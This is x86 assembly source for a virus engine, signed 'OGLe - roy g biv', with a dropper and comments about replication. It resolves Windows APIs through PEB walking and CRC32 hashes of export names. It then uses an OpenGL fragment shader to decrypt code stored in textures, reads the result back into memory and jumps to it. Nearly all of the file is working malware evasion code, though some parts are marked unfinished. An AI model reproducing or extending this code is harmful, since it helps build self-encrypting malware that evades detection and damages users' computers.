.386
.model  flat

extern  ExitProcess:proc

.data
include ogle.inc

arrsize         dd      ?
textsize        dd      ?
fb              dd      ?
textids         dd      3 dup (?)
texts           dd      2 dup (?)
modi            dd      ?
aloc            dd      ?
bloc            dd      ?
cloc            dd      ?
shader          dd      ?
program         dd      ?

dropper         label   near
        push    ebx
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, glucrc_count
        mov     ebx, offset glunames
        mov     edi, offset glucrcbegin
        call    create_crcs
        mov     edx, gdicrc_count
        mov     ebx, offset gdinames
        mov     edi, offset gdicrcbegin
        call    create_crcs
        mov     edx, usrcrc_count
        mov     ebx, offset usrnames
        mov     edi, offset usrcrcbegin
        call    create_crcs
        mov     edx, oglcrc_count
        mov     ebx, offset oglnames
        mov     edi, offset oglcrcbegin
        call    create_crcs

        mov     esi, offset ogle_codeend - offset ogle_inf
;to do: something here about nearest multiple of 4 with integer sqrt
        pop     ebx

ogle_codebegin  label   near
        push    ebx
        mov     eax, dword ptr [ebx + pebLdr]   ;ebx = fs:[30h] at start time
        mov     esi, dword ptr [eax + ldrInLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebx, dword ptr [eax + mlDllBase]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near
        dd      (krncrc_count + 1) dup (0)
krncrcend       label   near

        call    load_glu
        db      "glu32", 0

load_glu        label   near
        call    dword ptr [esp + 4 + krncrcstk.kLoadLibraryA]
        xchg    ebx, eax
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

glucrcbegin     label   near
        dd      (glucrc_count + 1) dup (0)
glucrcend       label   near

        call    load_gdi
        db      "gdi32", 0

load_gdi       label   near
        call    dword ptr [esp + 4 + size glucrcstk + krncrcstk.kGetModuleHandleA]
        xchg    ebx, eax
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

gdicrcbegin     label   near
        dd      (gdicrc_count + 1) dup (0)
gdicrcend       label   near

        call    load_user
        db      "user32", 0

load_user       label   near
        call    dword ptr [esp + 4 + size gdicrcstk + size glucrcstk + krncrcstk.kGetModuleHandleA]
        xchg    ebx, eax
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

usrcrcbegin     label   near
        dd      (usrcrc_count + 1) dup (0)
usrcrcend       label   near

        call    load_opengl
        db      "opengl32", 0

load_opengl     label   near
        call    dword ptr [esp + 4 + size usrcrcstk + size gdicrcstk + size glucrcstk + krncrcstk.kGetModuleHandleA]
        xchg    ebx, eax
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

oglcrcbegin     label   near
        dd      (oglcrc_count + 1) dup (0)
oglcrcend       label   near

api_stack       label   near
        mov     ebp, esp ;use lea if add more APIs
        xor     ebx, ebx
        push    ebx
        call    dword ptr [ebp + size oglcrcstk + size usrcrcstk + size gdicrcstk + size glucrcstk + krncrcstk.kGetModuleHandleA]
        push    "bgr"
        mov     ecx, esp
        push    esp
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    eax
        push    ebx
        push    ebx
        push    dword ptr [ebp + size oglcrcstk + usrcrcstk.uDefWindowProcA]
        push    CS_OWNDC
        mov     edx, esp
        push    ebx                             ;CreateWindowExA
        push    eax                             ;CreateWindowExA
        push    ebx                             ;CreateWindowExA
        push    ebx                             ;CreateWindowExA
        push    ebx                             ;CreateWindowExA
        push    ebx                             ;CreateWindowExA
        push    ebx                             ;CreateWindowExA
        push    ebx                             ;CreateWindowExA
        push    WS_CLIPSIBLINGS or WS_CLIPCHILDREN or WS_CAPTION or WS_SYSMENU or WS_THICKFRAME or WS_MINIMIZEBOX or WS_MAXIMIZEBOX
                                                ;CreateWindowExA
        push    ecx                             ;CreateWindowExA
        push    ecx                             ;CreateWindowExA
        push    ebx                             ;CreateWindowExA
        push    edx
        call    dword ptr [ebp + size oglcrcstk + usrcrcstk.uRegisterClassA]
        call    dword ptr [ebp + size oglcrcstk + usrcrcstk.uCreateWindowExA]
        push    eax
        xchg    esi, eax
        call    dword ptr [ebp + size oglcrcstk + usrcrcstk.uGetDC]
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    808h
        push    82000h
        push    PFD_SUPPORT_OPENGL or PFD_DRAW_TO_WINDOW
        push    10000h + size PIXELFORMATDESCRIPTOR
        mov     ecx, esp
        push    eax                             ;wglCreateContext
        push    ecx                             ;SetPixelFormat
        push    ecx
        push    eax
        xchg    edi, eax
        call    dword ptr [ebp + size oglcrcstk + size usrcrcstk + gdicrcstk.gChoosePixelFormat]
        push    eax
        push    edi
        call    dword ptr [ebp + size oglcrcstk + size usrcrcstk + gdicrcstk.gSetPixelFormat]
        call    dword ptr [ebp + oglcrcstk.owglCreateContext]
        mov     esp, ebp
        push    esi                             ;DestroyWindow
        push    eax                             ;wglDeleteContext
        push    eax
        push    edi
        call    dword ptr [ebp + oglcrcstk.owglMakeCurrent]

int 3
;to do:
;texts[texta]=alloc(arrsize*4, PAGE_EXECUTE_READWRITE)
;memcpy(texts[texta], ogle_inf, offset ogle_codeend - offset ogle_inf)
;texts[textb]=alloc(arrsize*4, PAGE_READWRITE)
;fill texts[textb] with encryption keys
;assign value to modi

        call    pop_wgladr
        db      "glActiveTexture", 0
        db      "glAttachShader", 0
        db      "glBindFramebufferEXT", 0
        db      "glCompileShader", 0
        db      "glCreateProgram", 0
        db      "glCreateShader", 0
        db      "glDeleteFramebuffersEXT", 0
        db      "glDeleteProgram", 0
        db      "glDeleteShader", 0
        db      "glDetachShader", 0
        db      "glFramebufferTexture2DEXT", 0
        db      "glGenFramebuffersEXT", 0
        db      "glGetUniformLocation", 0
        db      "glLinkProgram", 0
        db      "glShaderSource", 0
        db      "glUniform1f", 0
        db      "glUniform1i", 0
        db      "glUseProgram", 0

pop_wgladr      label   near
        pop     edi

get_wgladr      label   near
        push    edi
        call    dword ptr [ebp + oglcrcstk.owglGetProcAddress]
        push    eax
        xor     al, al
        or      ecx, -1
        repne   scas byte ptr [edi]
        cmp     byte ptr [edi], al
        jne     get_wgladr

;-----------------------------------------------------------------------------
;create framebuffer object and bind it
;-----------------------------------------------------------------------------

        push    offset fb
        push    1
        call    dword ptr [ebp + wglcrcstk.wglGenFramebuffersEXT - size wglcrcstk]
        push    dword ptr [offset fb]
        push    GL_FRAMEBUFFER_EXT
        call    dword ptr [ebp + wglcrcstk.wglBindFramebufferEXT - size wglcrcstk]

;-----------------------------------------------------------------------------
;set viewport for texture mapping
;-----------------------------------------------------------------------------

        push    GL_PROJECTION
        call    dword ptr [ebp + oglcrcstk.oglMatrixMode]
        call    dword ptr [ebp + oglcrcstk.oglLoadIdentity]
        push    ebx
        push    dword ptr [offset textsize]
        fild    dword ptr [esp]
        fst     qword ptr [esp]
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        fstp    qword ptr [esp]
        push    ebx
        push    ebx
        call    dword ptr [ebp + size oglcrcstk + size usrcrcstk + size gdicrcstk + glucrcstk.glgluOrtho2D]
        push    GL_MODELVIEW
        call    dword ptr [ebp + oglcrcstk.oglMatrixMode]
        call    dword ptr [ebp + oglcrcstk.oglLoadIdentity]
        mov     eax, dword ptr [offset textsize]
        push    eax
        push    eax
        push    ebx
        push    ebx
        call    dword ptr [ebp + oglcrcstk.oglViewport]

;-----------------------------------------------------------------------------
;create textures - two input textures (code to encrypt, encryption table), one output texture (encrypted/decrypted)
;-----------------------------------------------------------------------------

        push    offset textids
        push    3
        call    dword ptr [ebp + oglcrcstk.oglGenTextures]
        mov     esi, dword ptr [offset texts + texta]
        mov     edi, dword ptr [offset textids + codeid]
        call    loadtext
        mov     edi, dword ptr [offset textids + outpid]
        call    loadtext
        mov     esi, dword ptr [offset texts + textb]
        mov     edi, dword ptr [offset textids + xlatid]
        call    loadtext
        push    GL_REPLACE
        push    GL_TEXTURE_ENV_MODE
        push    GL_TEXTURE_ENV
        call    dword ptr [ebp + oglcrcstk.oglTexEnvi]

;-----------------------------------------------------------------------------
;create program object and shader object
;-----------------------------------------------------------------------------

        call    dword ptr [ebp + wglcrcstk.wglCreateProgram - size wglcrcstk]
        mov     dword ptr [offset program], eax
        push    GL_FRAGMENT_SHADER_ARB
        call    dword ptr [ebp + wglcrcstk.wglCreateShader - size wglcrcstk]
        mov     dword ptr [offset shader], eax

;-----------------------------------------------------------------------------
;shader source code, very simple right now
;-----------------------------------------------------------------------------

        call    skip_shader
        db      "uniform sampler2DRect a,b;"
        db      "uniform float c;"
        db      "void main(){"
        db      "gl_FragColor=texture2DRect(a,gl_TexCoord[0].st)+c*texture2DRect(b,gl_TexCoord[0].st);"
        db      "}", 0

skip_shader     label   near
        mov     eax, esp
        push    ebx
        push    eax
        push    1
        push    dword ptr [offset shader]
        call    dword ptr [ebp + wglcrcstk.wglShaderSource - size wglcrcstk]

;-----------------------------------------------------------------------------
;compile shader code, attach to program object, link entire program
;-----------------------------------------------------------------------------

        push    dword ptr [offset shader]
        call    dword ptr [ebp + wglcrcstk.wglCompileShader - size wglcrcstk]
        push    dword ptr [offset shader]
        push    dword ptr [offset program]
        call    dword ptr [ebp + wglcrcstk.wglAttachShader - size wglcrcstk]
        push    dword ptr [offset program]
        call    dword ptr [ebp + wglcrcstk.wglLinkProgram - size wglcrcstk]

;-----------------------------------------------------------------------------
;find location of variables to assign
;-----------------------------------------------------------------------------

        push    "a"
        push    esp
        push    dword ptr [offset program]
        call    dword ptr [ebp + wglcrcstk.wglGetUniformLocation - size wglcrcstk]
        mov     dword ptr [offset aloc], eax
        push    "b"
        push    esp
        push    dword ptr [offset program]
        call    dword ptr [ebp + wglcrcstk.wglGetUniformLocation - size wglcrcstk]
        mov     dword ptr [offset bloc], eax
        push    "c"
        push    esp
        push    dword ptr [offset program]
        call    dword ptr [ebp + wglcrcstk.wglGetUniformLocation - size wglcrcstk]
        mov     dword ptr [offset cloc], eax

;-----------------------------------------------------------------------------
;attach textures to framebuffer object and then enable shader program
;-----------------------------------------------------------------------------

        push    ebx
        push    dword ptr [offset textids + outpid]
        push    GL_TEXTURE_RECTANGLE_ARB
        push    GL_COLOR_ATTACHMENT0_EXT
        push    GL_FRAMEBUFFER_EXT
        call    dword ptr [ebp + wglcrcstk.wglFramebufferTexture2DEXT - size wglcrcstk]
        push    ebx
        push    dword ptr [offset textids + codeid]
        push    GL_TEXTURE_RECTANGLE_ARB
        push    GL_COLOR_ATTACHMENT1_EXT
        push    GL_FRAMEBUFFER_EXT
        call    dword ptr [ebp + wglcrcstk.wglFramebufferTexture2DEXT - size wglcrcstk]
        push    dword ptr [offset program]
        call    dword ptr [ebp + wglcrcstk.wglUseProgram - size wglcrcstk]

;-----------------------------------------------------------------------------
;enable encryption table texture and assign to variable
;-----------------------------------------------------------------------------

        push    GL_TEXTURE1
        call    dword ptr [ebp + wglcrcstk.wglActiveTexture - size wglcrcstk]
        push    dword ptr [offset textids + xlatid]
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebp + oglcrcstk.oglBindTexture]
        push    1
        push    dword ptr [offset bloc]
        call    dword ptr [ebp + wglcrcstk.wglUniform1i - size wglcrcstk]

;-----------------------------------------------------------------------------
;assign modifier value to variable
;-----------------------------------------------------------------------------

        push    dword ptr [offset modi]
        push    dword ptr [offset cloc]
        call    dword ptr [ebp + wglcrcstk.wglUniform1f - size wglcrcstk]

;-----------------------------------------------------------------------------
;set render destination, enable code texture, assign to variable
;-----------------------------------------------------------------------------

        push    GL_COLOR_ATTACHMENT0_EXT
        call    dword ptr [ebp + oglcrcstk.oglDrawBuffer]
        push    GL_TEXTURE0
        call    dword ptr [ebp + wglcrcstk.wglActiveTexture - size wglcrcstk]
        push    dword ptr [offset textids + codeid]
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebp + oglcrcstk.oglBindTexture]
        push    ebx
        push    dword ptr [offset aloc]
        call    dword ptr [ebp + wglcrcstk.wglUniform1i - size wglcrcstk]

;-----------------------------------------------------------------------------
;define rectangle that holds texture, perform rendering
;-----------------------------------------------------------------------------

        push    GL_QUADS
        call    dword ptr [ebp + oglcrcstk.oglBegin]
        push    ebx
        push    ebx
        call    dword ptr [ebp + oglcrcstk.oglTexCoord2f]
        push    ebx
        push    ebx
        call    dword ptr [ebp + oglcrcstk.oglVertex2f]
        push    ebx
        push    dword ptr [offset textsize]
        fild    dword ptr [esp]
        fstp    dword ptr [esp]
        pop     esi
        push    esi
        call    dword ptr [ebp + oglcrcstk.oglTexCoord2f]
        push    ebx
        push    esi
        call    dword ptr [ebp + oglcrcstk.oglVertex2f]
        push    esi
        push    esi
        call    dword ptr [ebp + oglcrcstk.oglTexCoord2f]
        push    esi
        push    esi
        call    dword ptr [ebp + oglcrcstk.oglVertex2f]
        push    esi
        push    ebx
        call    dword ptr [ebp + oglcrcstk.oglTexCoord2f]
        push    esi
        push    ebx
        call    dword ptr [ebp + oglcrcstk.oglVertex2f]
        call    dword ptr [ebp + oglcrcstk.oglEnd]

;-----------------------------------------------------------------------------
;read data from texture, run it
;-----------------------------------------------------------------------------

        push    GL_COLOR_ATTACHMENT0_EXT
        call    dword ptr [ebp + oglcrcstk.oglReadBuffer]
        mov     esi, dword ptr [offset texts + texta]
        push    esi
        push    GL_FLOAT
        push    GL_RGBA
        mov     eax, dword ptr [offset textsize]
        push    eax
        push    eax
        push    ebx
        push    ebx
        call    dword ptr [ebp + oglcrcstk.oglReadPixels]
        jmp     esi

loadtext        proc    near
        push    edi
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebp + oglcrcstk.oglBindTexture]
        push    GL_NEAREST
        push    GL_TEXTURE_MIN_FILTER
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebp + oglcrcstk.oglTexParameteri]
        push    GL_NEAREST
        push    GL_TEXTURE_MAG_FILTER
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebp + oglcrcstk.oglTexParameteri]
        push    GL_CLAMP
        push    GL_TEXTURE_WRAP_S
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebp + oglcrcstk.oglTexParameteri]
        push    GL_CLAMP
        push    GL_TEXTURE_WRAP_T
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebp + oglcrcstk.oglTexParameteri]
        push    ebx
        push    GL_FLOAT
        push    GL_RGBA
        push    ebx
        mov     eax, dword ptr [offset textsize]
        push    eax
        push    eax
        push    GL_RGBA32F_ARB
        push    ebx
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebp + oglcrcstk.oglTexImage2D]
ife MODE_ATI
        push    esi
        push    GL_FLOAT
        push    GL_RGBA
        mov     eax, dword ptr [offset textsize]
        push    eax
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    GL_TEXTURE_RECTANGLE_ARB
        call    dword ptr [ebp + oglcrcstk.oglTexSubImage2D]
else
        push    ebx
        push    esi
        push    GL_TEXTURE_RECTANGLE_ARB
        push    GL_COLOR_ATTACHMENT0_EXT
        push    GL_FRAMEBUFFER_EXT
        call    dword ptr [ebp + oglcrcstk.oglFramebufferTexture2DEXT]
        push    GL_COLOR_ATTACHMENT0_EXT
        call    dword ptr [ebp + oglcrcstk.oglDrawBuffer]
        push    ebx
        push    ebx
        call    dword ptr [ebp + oglcrcstk.oglRasterPos2i]
        push    esi
        push    GL_FLOAT
        push    GL_RGBA
        mov     eax, dword ptr [offset textsize]
        push    eax
        push    eax
        call    dword ptr [ebp + oglcrcstk.oglDrawPixels]
        push    ebx
        push    ebx
        push    GL_TEXTURE_RECTANGLE_ARB
        push    GL_COLOR_ATTACHMENT0_EXT
        push    GL_FRAMEBUFFER_EXT
        call    dword ptr [ebp + oglcrcstk.oglFramebufferTexture2DEXT]
endif
        ret
loadtext        endp
        db      "OGLe - roy g biv"              ;check it out! ;)

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

parse_exports   label   near
        pop     edi
        mov     esi, dword ptr [ebx + mzhdr.mzlfanew]
        mov     esi, dword ptr [ebx + esi + pehdr.peexport.dirrva]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        scas    dword ptr [edi]
        jmp     edi
        db      "12/03/12"

ogle_inf        label   near
        int     3

;-----------------------------------------------------------------------------
;clean up time
;-----------------------------------------------------------------------------

        push    dword ptr [offset shader]
        push    dword ptr [offset program]
        call    dword ptr [ebp + wglcrcstk.wglDetachShader - size wglcrcstk]
        push    dword ptr [offset shader]
        call    dword ptr [ebp + wglcrcstk.wglDeleteShader - size wglcrcstk]
        push    dword ptr [offset program]
        call    dword ptr [ebp + wglcrcstk.wglDeleteProgram - size wglcrcstk]
        push    offset fb
        push    1
        call    dword ptr [ebp + wglcrcstk.wglDeleteFramebuffersEXT - size wglcrcstk]

;free(texts[textb]);
;free(texts[texta]);

        push    offset textids
        push    3
        call    dword ptr [ebp + oglcrcstk.oglDeleteTextures]
        lea     esp, dword ptr [ebp - 8]
        call    dword ptr [ebp + oglcrcstk.owglDeleteContext]
        call    dword ptr [ebp + size oglcrcstk + usrcrcstk.uDestroyWindow]
        call    ExitProcess
ogle_codeend    label   near

create_crcs     proc    near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stos    dword ptr [edi]
        dec     edx
        jne     create_crcs
        ret
create_crcs     endp

;must be alphabetical order
;API names are not present in replications, only in dropper

krnnames        db      "GetModuleHandleA", 0
                db      "GetProcAddress"  , 0
                db      "LoadLibraryA"    , 0

glunames        db      "gluOrtho2D", 0

gdinames        db      "ChoosePixelFormat", 0
                db      "SetPixelFormat"   , 0

usrnames        db      "CreateWindowExA", 0
                db      "DefWindowProcA" , 0
                db      "DestroyWindow"  , 0
                db      "GetDC"          , 0
                db      "RegisterClassA" , 0

oglnames        db      "glBegin"          , 0
                db      "glBindTexture"    , 0
                db      "glDeleteTextures" , 0
                db      "glDrawBuffer"     , 0
if MODE_ATI
                db      "glDrawPixels"     , 0
endif
                db      "glEnd"            , 0
                db      "glGenTextures"    , 0
                db      "glLoadIdentity"   , 0
                db      "glMatrixMode"     , 0
if MODE_ATI
                db      "glRasterPos2i"    , 0
endif
                db      "glReadBuffer"     , 0
                db      "glReadPixels"     , 0
                db      "glTexCoord2f"     , 0
                db      "glTexEnvi"        , 0
                db      "glTexImage2D"     , 0
                db      "glTexParameteri"  , 0
ife MODE_ATI
                db      "glTexSubImage2D"  , 0
endif
                db      "glVertex2f"       , 0
                db      "glViewport"       , 0
                db      "wglCreateContext" , 0
                db      "wglDeleteContext" , 0
                db      "wglGetProcAddress", 0
                db      "wglMakeCurrent"   , 0

.code
        nop
end     dropper
